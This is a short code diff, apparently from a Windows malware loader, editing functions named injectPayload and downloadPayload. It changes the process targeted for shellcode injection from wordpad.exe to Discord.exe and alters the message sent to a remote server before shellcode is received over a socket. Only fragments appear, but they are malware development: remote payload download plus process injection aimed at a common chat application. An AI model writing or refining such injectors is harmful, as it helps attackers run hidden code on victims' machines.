@@ -51,7 +51,7 @@ BOOL injectPayload() {
         return TRUE;
     }
 
-    DWORD PID = getProcessPID("wordpad.exe");
+    DWORD PID = getProcessPID("Discord.exe");
     CLIENT_ID CID = {PID, NULL};
     InitializeObjectAttributes(&OA, NULL, 0, NULL, NULL);
 
@@ -124,7 +124,7 @@ BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
         goto CLEANUP;
     }
 
-    const char* message = "Hello, Server!";
+    const char* message = "OK";
     if (send(clientSocket, message, (int)strlen(message), 0) == SOCKET_ERROR) {
         goto CLEANUP;
     } 
